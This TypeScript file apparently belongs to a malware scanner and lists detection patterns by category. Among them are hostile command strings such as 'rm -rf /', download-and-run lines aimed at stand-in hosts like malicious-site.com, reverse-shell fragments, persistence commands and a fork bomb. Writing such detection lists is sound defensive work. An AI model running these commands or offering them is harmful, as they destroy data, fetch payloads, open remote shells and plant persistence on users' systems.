
// Source: User request and refinement to reduce false positives
export const malwarePatterns: Record<string, string[]> = {
  'File System Manipulation': [
    'rm -rf /', // Highly destructive command
    'chmod +x payload.sh', // Making a script executable
    './payload.sh', // Executing a script
    'delete secret.txt', // Deleting potentially important files
    'move payload.exe C:\\Windows\\System32', // Moving executable to system dir
    'overwrite config.ini', // Overwriting configuration
  ],
  'Suspicious Network Activity': [
    'wget http://malicious-site.com/payload.sh', // Downloading from known bad URL
    'curl -O http://bad-domain.org/malware.exe', // Downloading from known bad URL
    'nc -lvp 4444', // Setting up a listener (potential backdoor)
    'bash -i >& /dev/tcp/', // Reverse shell attempt
    'powershell -enc', // Encoded PowerShell, often used for obfuscation
    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')", // Download and execute PS script
    '(New-Object Net.WebClient).DownloadString', // Downloading strings/scripts
    'Invoke-WebRequest -Uri "http://malicious-site.com/file.exe"', // Downloading executable
    'bitsadmin /transfer myjob /download', // Using bitsadmin for downloads
    'certutil -urlcache -split -f http://malicious-site.com/file.exe', // Using certutil for downloads
    'http://malicious-site.com', // Accessing known malicious domain
    'bad-domain.org', // Accessing known malicious domain
    'pastebin.com/raw/', // Often used for payload hosting
    '/bin/bash -i > /dev/tcp/',
    'navigator.geolocation.getCurrentPosition.*fetch.*http', // Geolocation exfiltration snippet
    '/c2/server',
    '/gate.php',
    'api/tasks',
  ],
  'Command Execution & Obfuscation': [
    'eval(atob(', // Decoding Base64 and executing
    'bash -c "exec bash >/dev/tcp/', // Obfuscated reverse shell
    'Runtime.getRuntime().exec(', // Java code execution
    'subprocess.call(', // Python code execution
    'system(', // C/C++ code execution
    'ShellExecute(', // Windows API for execution
    'CreateProcess(', // Windows API for execution
  ],
  'Persistence Mechanisms': [
    'schtasks /create /tn Backdoor', // Creating scheduled task for persistence
    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', // Adding registry run key
    'regsvr32 /s', // Silent registration of DLL (potential hijacking)
    'msiexec /i http://malicious-site.com/installer.msi /quiet', // Silent MSI installation
    'crontab -e', // Editing cron jobs for persistence
    '/etc/init.d/malware', // Adding script to init.d
    'systemctl enable malware.service', // Enabling systemd service
  ],
  'Privilege Escalation': [
    'sudo su', // Attempting to switch to root
    'SetWindowsHookEx', // Windows API often used by keyloggers/malware
    'DirtyCow', // Known Linux privilege escalation exploit name
    'EternalBlue', // Known Windows exploit name
  ],
  'Information Stealing': [
    'logkeys --start', // Starting a keylogger
    'mimikatz', // Known credential dumping tool
    'pwdump', // Password dumping tool
    'getpass', // Function often used to get passwords (Python)
    // Removed Android specific permissions as APK analysis is removed
    // 'READ_SMS',
    // 'READ_CONTACTS',
    // 'android.permission.READ_LOGS',
    'credentials.json', // Common filename for stored credentials
    'private_key.pem', // Common filename for private keys
  ],
  'Steganography Tools/Keywords': [ // Keywords related to hiding data
    'steghide embed',
    'outguess -k',
    'exiftool -Comment=', // Modifying metadata to hide data
    'snowdrop', // Steganography tool name
  ],
  // Removed 'APK Malware Keywords' category
  'Miscellaneous Malware Terms': [
    'taskkill /f /im explorer.exe', // Killing explorer process
    'wmic process call create', // Using WMI to create processes
    ':(){ :|:& };:', // Fork bomb
    'exploit.py', // Generic exploit script name
    'dropper.sh', // Generic dropper script name
    'ransomware', // Keyword
    'keylogger', // Keyword
    'trojan', // Keyword
    'backdoor', // Keyword
  ],
};

// Regenerate the flat list of all patterns
export const allPatterns: string[] = Object.values(malwarePatterns).flat();
